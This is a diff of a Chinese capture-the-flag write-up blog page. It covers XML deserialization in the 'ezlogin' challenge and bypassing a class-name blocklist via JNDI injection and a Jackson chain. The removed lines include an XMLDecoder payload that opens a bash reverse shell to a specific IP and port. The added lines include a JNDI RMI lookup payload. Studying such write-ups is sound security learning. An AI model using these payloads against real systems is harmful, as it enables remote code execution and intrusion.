@@ -79,7 +79,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CHECKIN"><span class="toc-number">2.</span> <span class="toc-text">CHECKIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flow"><span class="toc-number">3.</span> <span class="toc-text">flow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ollama4shell%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">ollama4shell（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezlogin%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">ezlogin（Unsolved）</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CHECKIN"><span class="toc-number">2.</span> <span class="toc-text">CHECKIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flow"><span class="toc-number">3.</span> <span class="toc-text">flow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ollama4shell%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">ollama4shell（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezlogin%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">ezlogin（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#paisa4shell%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">paisa4shell（Unsolved）</span></a></li></ol>
     </div>
   
 
@@ -256,7 +256,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.1k字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -265,7 +265,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">6分</span>
+        <span class="post-count">7分</span>
       </span>
     </span>
     
@@ -282,6 +282,7 @@
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web剩下3题全场零解，7小时真能做吗哥</p>
 <p>官方wp：<a target="_blank" rel="noopener" href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#">https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#</a></p>
+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/10/24/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/">https://zer0peach.github.io/2024/10/24/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/</a></p>
 <span id="more"></span>
 
 <hr>
@@ -486,7 +487,7 @@ HOME_PAGE_HTML <span class="token operator">=</span> <span class="token triple-q
     <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>目的明确，构造恶意xml打反序列化</p>
+<p>目的明确，构造恶意xml在 <code>readObjectFromXml</code> 打反序列化，过滤了 <code>java.</code> 、 <code>springframework.</code> 、<code>hutool.</code>，不能直接RCE，注意到有 jackson 库，可以打 jndi 注入触发 jackson 链子</p>
 <p>生成xml的地方在这里</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
     <span class="token class-name">File</span> userFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token constant">USER_DIR</span><span class="token punctuation">,</span> username <span class="token operator">+</span> <span class="token string">".xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -501,9 +502,25 @@ HOME_PAGE_HTML <span class="token operator">=</span> <span class="token triple-q
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>那么闭合标签在password进行构造，发现有限制长度</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>&lt;object class=\"java.lang.ProcessBuilder\">&lt;array class=\"java.lang.String\" length=\"1\">&lt;void index=\"0\"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>bash -c 'bash -i >&amp; /dev/tcp/115.236.153.177/30908 0>&amp;1'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span>&lt;void method=\"start\"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">String</span> usernameRe <span class="token operator">=</span> <span class="token string">"^[\\x20-\\x7E]&#123;1,6&#125;$"</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> passwordRe <span class="token operator">=</span> <span class="token string">"^[\\x20-\\x7E]&#123;3,10&#125;$"</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> username<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>usernameRe<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>passwordRe<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>我们要构造的payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javax.naming.InitialContext<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lookup<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>rmi://ip:port/a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>这就是这题的关键了，<strong>把想要替换的内容通过登录生成<code>JSESSIONID</code>，然后收集这些session</strong></p>
+<p>最后利用那些session对同一个文件进行替换</p>
+<hr>
+<h1 id="paisa4shell（Unsolved）"><a href="#paisa4shell（Unsolved）" class="headerlink" title="paisa4shell（Unsolved）"></a>paisa4shell（Unsolved）</h1>
     </div>
     
     
